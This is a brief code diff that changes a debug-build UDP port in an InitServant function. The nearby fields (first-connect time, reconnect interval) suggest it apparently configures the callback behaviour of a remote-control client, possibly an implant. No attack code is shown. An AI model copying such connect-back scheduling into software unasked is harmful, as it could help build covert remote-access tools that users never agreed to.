@@ -16,7 +16,7 @@ SERVANT_API void InitServant()
 {
 #ifdef _DEBUG
 	g_ConfigInfo.nDefaultCommType = COMMNAME_UDP;
-	g_ConfigInfo.nPort = 8822;
+	g_ConfigInfo.nPort = 8082;
 	g_ConfigInfo.nFirstConnectHour = -1;
 	g_ConfigInfo.nFirstConnectMinute = -1;
 	g_ConfigInfo.nTryConnectIntervalM = 1;
